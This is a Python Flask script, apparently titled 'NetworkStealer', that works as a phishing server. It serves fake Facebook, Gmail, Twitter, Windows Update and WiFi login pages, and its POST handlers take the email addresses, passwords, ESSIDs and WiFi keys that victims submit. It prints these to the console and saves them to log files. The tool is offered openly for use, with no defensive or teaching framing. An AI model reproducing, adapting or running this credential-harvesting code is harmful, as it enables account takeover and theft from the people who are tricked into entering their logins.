import os
import configparser
import datetime

try:
    from flask import Flask, render_template, request
except ImportError:
    print("Module Flask not Installed. Cannot Continue.")
    input("Press Enter to Exit.")

try:
    import colorama
    from colorama import Fore, Style
except ImportError:
    print("Module Colorama is not Installed. Cannot Continue.")
    input("Press Enter to Exit.")


def __main__():

    def logtoFile(filename, text): 
        mainFile = open(filename, "w+")
        mainFile.write("~ Program Started.\n")
        mainFile.write(text)
        mainFile.close()


    config = configparser.ConfigParser()

    try:
        config.read("settings.ini")
    except Exception as e:
        print("Error Occured : " + e)
        print("May be the Configuration File has been deleted?")
        input("")
        exit(1)

    maincfg = config['DEFAULT']

    def flaskapp():

        print("[ - ] Select a Phishing Template")
        print("[1]: Facebook Phishing ")
        print("[2]: Windows Update Phishing")
        print("[3]: Gmail Phishing")
        print("[4]: WiFi Phishing")
        print("[5]: Twitter Phishing")
        template = input("[ + ] Enter your Template : ")

        if(template == "1"):
            index_file = "facebook.html"
        elif(template == "2"):
            index_file = "system.html"
        elif(template == "3"):
            index_file = "gmail_index.html"
        elif(template == "4"):
            index_file = "wifi_index.html"
        elif(template == "5"):
            index_file = "twitter.html"
        else:
            print("Unidentified Template. Cannot Continue.")
            input("")
            exit(1)

        app = Flask(__name__, template_folder="templates")
        app.static_folder = 'static'

        @app.route("/")
        def main():
            return render_template(index_file)

        @app.route("/wifi_login.html", methods=['POST'])
        def login_page():
            if(request.method == "POST"):

                essid = request.form.get('essid')
                password = request.form.get('password')

                print(Fore.LIGHTCYAN_EX + "[DATA]: " + essid + Style.RESET_ALL)
                print(Fore.LIGHTCYAN_EX + "[DATA]: " + password + Style.RESET_ALL)

                if(maincfg['save_log'] == "True"):
                    logtoFile("ns_wifi.txt" , "[ESSID]: " + essid + "\n[PASSWORD]: " + password + "\n")
                else:
                    print(Fore.LIGHTYELLOW_EX + "[!] Not saving Logs due to save_log being False in settings.ini" + Style.RESET_ALL)
            else:
                print("[ - ] Somethings not right.. Exiting")
                exit(1)

            return render_template("wifi_login.html")

        @app.route("/system_login.html", methods=["POST"])
        def system_page():
            if(request.method == "POST"):
                winEmail = request.form.get('microsoftemail')
                winPass = request.form.get('microsoftpassword')

                print(Fore.LIGHTCYAN_EX + "[DATA]: " + str(winEmail) + Style.RESET_ALL)
                print(Fore.LIGHTCYAN_EX + "[DATA]: " + str(winPass) + Style.RESET_ALL)

                if(maincfg['save_log'] == "True"):
                    logtoFile( "ns_windows.txt","[MICROSOFT_EMAIL]: " + winEmail + "\n[MICROSOFT_PASSWORD]: " + winPass + "\n")
                else:
                    print(Fore.LIGHTYELLOW_EX + "[!] Not saving Logs due to save_log being False in settings.ini" + Style.RESET_ALL)
            else:
                print("[ - ] Somethings not right.. Exiting")
                exit(1)

            return render_template("system_login.html")

        @app.route("/facebook_login.html", methods=["POST"])
        def facebook():
            if(request.method == "POST"):

                fbemail = request.form.get("fbemail")
                fbpass = request.form.get("fbpassword")

                print(Fore.LIGHTCYAN_EX + "[DATA]: " + str(fbemail) + Style.RESET_ALL)
                print(Fore.LIGHTCYAN_EX + "[DATA]: " + str(fbpass) + Style.RESET_ALL)

                if(maincfg['save_log'] == "True"):
                    logtoFile("ns_facebook.txt", "[FBEMAIL]: " + fbemail + "\n[FBPASS]: " + fbpass + "\n" ) 
                else:
                    print(Fore.LIGHTYELLOW_EX + "[!] Not saving Logs due to save_log being False in settings.ini" + Style.RESET_ALL)
            else:
                print("[ - ] Somethings not right.. Exiting")
                exit(1)

            return render_template("facebook_login.html")
        

        @app.route("/gmail_login.html", methods=["POST"])
        def GoogleMail():
            if(request.method == "POST"):

                gmail = request.form.get("gmail")
                gpass = request.form.get("gpass")

                print(Fore.LIGHTCYAN_EX + "[DATA]: " + str(gmail) + Style.RESET_ALL)
                print(Fore.LIGHTCYAN_EX + "[DATA]: " + str(gpass) + Style.RESET_ALL)

                if(maincfg['save_log'] == "True"):
                    logtoFile("ns_gmail.txt", "[GMAIL]: " + gmail + "\n[GPASS]: " + gpass + "\n" ) 
                else:
                    print(Fore.LIGHTYELLOW_EX + "[!] Not saving Logs due to save_log being False in settings.ini" + Style.RESET_ALL)
            else:
                print("[ - ] Somethings not right.. Exiting")
                exit(1)

            return render_template("gmail_login.html")



        @app.route("/twitter_login.html", methods=["POST"])
        def Twitter():
            if(request.method == "POST"):

                twitterEmail = request.form.get("twitterEmail")
                twitterPassword = request.form.get("twitterPassword")

                print(Fore.LIGHTCYAN_EX + "[DATA]: " + str(twitterEmail) + Style.RESET_ALL)
                print(Fore.LIGHTCYAN_EX + "[DATA]: " + str(twitterPassword) + Style.RESET_ALL)

                if(maincfg['save_log'] == "True"):
                    logtoFile("ns_twitter.txt", "[TWITTEREMAIL]: " + twitterEmail + "\n[TWITTERPASSWORD]: " + twitterPassword + "\n" ) 
                else:
                    print(Fore.LIGHTYELLOW_EX + "[!] Not saving Logs due to save_log being False in settings.ini" + Style.RESET_ALL)
            else:
                print("[ - ] Somethings not right.. Exiting")
                exit(1)

            return render_template("twitter_login.html")

        app.run(host=maincfg['HOST'], port=int(maincfg['PORT']))


    def clear():
        if(os.name == 'nt'):
            os.system("cls")
        else:
            os.system("clear")

    clear()
    print(Style.RESET_ALL + Style.BRIGHT + """

    |  || | __|_   _| | | |/__|| _ | |/ /  __  /' _/_   _| __|/  || | | __| _ |
    | | ' | _|  | | | 'V' | || | v /   <  |__| `._`. | | | _|| /| | |_| _|| v /
    |_||__|___| |_| !_| |_!|__/|_|_|_||_|      |___/ |_| |___|_||_|___|___|_|_|

    | Author : Lynx
    | Web : http://fahadm.co.nf
    | Discord Server : https://discordapp.com/invite/8snh7nx
    """ + Fore.RED + """| If the View is Bugged. Please Maximize Console to full screen.\n\n""" + Style.RESET_ALL)
    # Almost all of my Programs contain this format lol
    main = input(Fore.LIGHTGREEN_EX + "[NETWORKSTEALER]: ")
    if(main == "start"):

        flaskapp()
    elif(main == "help"):
        print(Fore.LIGHTCYAN_EX + "Commands : ")
        print("- start - Start Lan Server.")
        print("- exit - Exit.")
        print("- help - Print this Help message."+ Style.RESET_ALL)
        input("")
        __main__()
    elif(main == "exit"):
        exit(1)
    else:
        print("> " + main + ", Type help.")
        input("")
        __main__()

if __name__ == "__main__":
    __main__()
